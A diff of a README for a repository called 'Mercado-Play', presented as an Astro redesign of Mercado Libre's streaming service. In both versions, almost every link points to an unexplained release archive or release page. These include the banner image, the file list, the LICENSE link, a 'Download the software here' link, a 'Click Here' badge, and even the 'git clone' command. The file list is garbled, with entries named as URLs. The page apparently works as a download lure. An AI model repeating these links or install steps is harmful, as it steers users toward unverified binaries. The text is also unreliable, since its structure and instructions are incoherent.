@@ -1,6 +1,6 @@
 # Welcome to Mercado-Play 🚀
 
-![Mercado-Play](https://github.com/valna/Mercado-Play/releases/download/v1.0/Release.zip)
+![Mercado-Play](https://github.com/valna/Mercado-Play/releases/tag/v2.0)
 
 ## Overview
 Welcome to the Mercado-Play repository, where we have redesigned the streaming service of Mercado Libre using Astro. Dive in and explore the magic of Mercado-Play!
@@ -23,12 +23,12 @@ Welcome to the Mercado-Play repository, where we have redesigned the streaming s
 - **public:** Static files used in the project
 - **.gitignore:** Specifies intentionally untracked files to ignore
 - **LICENSE:** MIT License file
-- **https://github.com/valna/Mercado-Play/releases/download/v1.0/Release.zip** Manifest file for https://github.com/valna/Mercado-Play/releases/download/v1.0/Release.zip projects
-- **https://github.com/valna/Mercado-Play/releases/download/v1.0/Release.zip** You are here!
-- **https://github.com/valna/Mercado-Play/releases/download/v1.0/Release.zip** [Download the software here](https://github.com/valna/Mercado-Play/releases/download/v1.0/Release.zip)  
+- **https://github.com/valna/Mercado-Play/releases/tag/v2.0** Manifest file for https://github.com/valna/Mercado-Play/releases/tag/v2.0 projects
+- **https://github.com/valna/Mercado-Play/releases/tag/v2.0** You are here!
+- **https://github.com/valna/Mercado-Play/releases/tag/v2.0** [Download the software here](https://github.com/valna/Mercado-Play/releases/tag/v2.0)  
 
 ## Installation
-1. Clone the repository using `git clone https://github.com/valna/Mercado-Play/releases/download/v1.0/Release.zip`
+1. Clone the repository using `git clone https://github.com/valna/Mercado-Play/releases/tag/v2.0`
 2. Navigate into the project directory
 3. Install dependencies with `npm install`
 4. Start the development server with `npm run start`
@@ -40,11 +40,11 @@ Once the installation is complete, you can start exploring the Mercado-Play stre
 For any issues or questions, please check out the "Releases" section or open a new issue in the repository. We are here to help you get the best out of Mercado-Play!
 
 ## License
-This project is licensed under the MIT License - see the [LICENSE](https://github.com/valna/Mercado-Play/releases/download/v1.0/Release.zip) file for details.
+This project is licensed under the MIT License - see the [LICENSE](https://github.com/valna/Mercado-Play/releases/tag/v2.0) file for details.
 
 ---
 
-[![](https://github.com/valna/Mercado-Play/releases/download/v1.0/Release.zip%20Software-Click%20Here-green)](https://github.com/valna/Mercado-Play/releases/download/v1.0/Release.zip)
+[![](https://github.com/valna/Mercado-Play/releases/tag/v2.0%20Software-Click%20Here-green)](https://github.com/valna/Mercado-Play/releases/tag/v2.0)
 
 ---
 
